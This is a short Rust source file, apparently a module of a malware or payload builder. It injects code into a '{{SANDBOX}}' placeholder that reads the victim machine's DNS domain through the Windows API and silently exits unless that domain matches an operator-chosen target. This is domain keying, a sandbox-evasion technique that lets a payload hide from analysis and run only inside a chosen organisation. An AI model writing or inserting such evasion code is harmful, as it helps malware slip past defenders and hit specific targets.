use crate::techniques::{BuildContext, Technique, TechniqueMeta};

pub struct DomainPin;

impl Technique for DomainPin {
    fn meta(&self) -> &'static TechniqueMeta { &DOMAIN_PIN_META }

    fn apply(&self, ctx: &mut BuildContext) -> anyhow::Result<()> {
        let expected = ctx.param("domain_pin", "domain").unwrap_or("");
        if expected.is_empty() {
            // user enabled the check but didn't fill in a domain
            return Ok(());
        }

        let sandbox_function = format!(
"fn evasion_domain_pin_get_name() -> Option<String> {{
    let mut size: u32 = 256;
    let mut buffer: Vec<u16> = vec![0; size as usize];
    let success = unsafe {{ winapi::um::sysinfoapi::GetComputerNameExW(winapi::um::sysinfoapi::ComputerNameDnsDomain, buffer.as_mut_ptr(), &mut size) }};
    if success == 0 || size == 0 {{ return None; }}
    let domain_name = String::from_utf16(&buffer[..size as usize]).map(|s| s.trim_end_matches('\\0').to_string()).ok()?;
    if domain_name.is_empty() {{ return None; }}
    Some(domain_name)
}}
fn evasion_domain_pin() {{
    match evasion_domain_pin_get_name() {{
        Some(domain) => {{ if !domain.as_str().eq_ignore_ascii_case(\"{0}\") {{ std::process::exit(0); }} }}
        None => {{ std::process::exit(0); }}
    }}
}}
evasion_domain_pin();", expected);

        ctx.append_replacement("{{SANDBOX}}", sandbox_function);
        Ok(())
    }
}

pub use super::super::DOMAIN_PIN_META;
